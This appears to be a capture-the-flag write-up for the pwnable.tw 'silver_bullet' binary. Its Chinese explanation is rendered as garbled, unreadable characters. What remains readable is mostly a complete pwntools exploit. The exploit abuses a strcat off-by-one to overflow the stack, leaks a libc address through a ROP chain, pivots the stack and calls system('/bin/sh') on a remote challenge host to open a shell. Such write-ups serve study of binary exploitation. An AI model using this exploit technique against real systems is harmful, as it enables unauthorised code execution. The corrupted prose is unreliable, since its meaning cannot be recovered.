## **Wp for silver_bullet**
+ IDA32��silver_bullet����������αC����
+ ��������֪���ó�������б�ͨ�����룬ִ�в�ͬ����
    ![create_bullet����](./silver_bullet/creat_bullet.png)
    ![power_up����](./silver_bullet/power_up.png)
    ![beat����](./silver_bullet/beat.png)
+ ͨ����������֪������һ���򵥵���Ϸ���Ի�������������ַ���������Ϊpower������wolf����wolf��HPС�ڵ���0ʱ����Ϸ��ʤ�����������ء�
+ �������������ַ������ȣ�һ��Ϊ�û������ַ������ȣ��û�����������ַ�������Ϊ48
+ ������Ҫͨ�������ʹ����Ϸ��ʤ����������������ʱ��ʹ��ջ��������shell
+ ͨ�������Ͳ������ϣ�strcat������ִ�н�������ڽ�β���0�ַ������ڸó����в���һ���ַ������
+ ������պø��ǵ�ԭ��������ַ�������
+ ������create_bulle���һ��power_up�����У���������ַ����ܳ�Ϊ48����ɵڶ��ε���power_up��������ɸ����ֽڵ�ջ���
+ Ϊʹ�ڶ��ο������ֽڴﵽ���creat_bulletʱ����47�ֽڵ��ַ���power_upʱ����1�ֽڣ��Ի��47-7�ֽڵ����ÿռ�


+ ���ڳ�����û��system��������Ҫͨ����������й¶libc��ַ��������ʹ��puts����
+ ʹ��pwntools����rop��
+ +  ����puts���������got.puts��ֵ�����ڼ���system������ַ
  +  ʹ�ó�����read_input��������ͨ����ȡй¶��system��ַ�����Ľ�һ��payload�����ݶΣ�ʹ��pwntools��rop��migrate�������Լ�leave;retʹespת���µ�ַ
  +  ����������£�  

```python
elf=ELF('../silver/silver_bullet')
rop=ROP('../silver/silver_bullet')
libc=ELF('../silver/libc_32.so.6')

puts_got=elf.got['puts']

rop.raw('\x01\xff\xff\xff')
rop.raw(0x804B410)
rop.puts(int(hex(puts_got)[2:],16))
rop.call('read_input',(0x0804B410,0x01010101))
rop.migrate(0x804B410)
```

+ ���rop������

    ![](./silver_bullet/rop_1.png)
+ + ���ݻ�õ�system��ַ��������rop����ִ��system("/bin/sh")
  + �������£�

```python
puts_addr=u32(p.recv()[0:4])
system=libc.symbols['system']-libc.symbols['puts']+puts_addr

rop=ROP('../silver/silver_bullet')
rop.call(system,(0x0804B41c,))
rop.raw('/bin/sh\x00')
```
+ ���rop������

    ![](./silver_bullet/rop_2.png)
### ���մ��뼰���
+ ����

```python
from pwn import *
p=remote("chall.pwnable.tw",10103)
elf=ELF('../silver/silver_bullet')
rop=ROP('../silver/silver_bullet')
libc=ELF('../silver/libc_32.so.6')

puts_got=elf.got['puts']

rop.raw('\x01\xff\xff\xff')
rop.raw(0x804B410)
rop.puts(int(hex(puts_got)[2:],16))
rop.call('read_input',(0x0804B410,0x01010101))
rop.migrate(0x804B410)

print rop.dump()
print hex(len(rop.chain()))
result=''
for i in str(rop):
    result+='0'*(2-len(hex(ord(i))[2:]))+hex(ord(i))[2:]
print result
payload=str(rop)[1:]
print hex(len(payload))
result=''
for i in payload:
    result+='0'*(2-len(hex(ord(i))[2:]))+hex(ord(i))[2:]
print result
p.recvuntil('Your choice :')

p.sendline("1")
p.recvuntil('Give me your description of bullet :')

p.sendline('A'*0x2F)
p.recvuntil('Your choice :')

p.sendline("2")
p.recvuntil('Give me your another description of bullet :')

p.sendline("A")
p.recvuntil('Your choice :')

p.sendline("2")
p.recvuntil('Give me your another description of bullet :')

p.sendline(payload)
p.recvuntil('Your choice :')

p.sendline("3")
p.recvuntil("Oh ! You win !!\n")
puts_addr=u32(p.recv()[0:4])
system=libc.symbols['system']-libc.symbols['puts']+puts_addr

rop=ROP('../silver/silver_bullet')
rop.call(system,(0x0804B41c,))
rop.raw('/bin/sh\x00')
print rop.dump()
p.sendline(str(rop))
p.interactive("\nshell# ")
```
+ ���

    ![result](./silver_bullet/result.png) 
### ����
+ [README.md](../README.md)
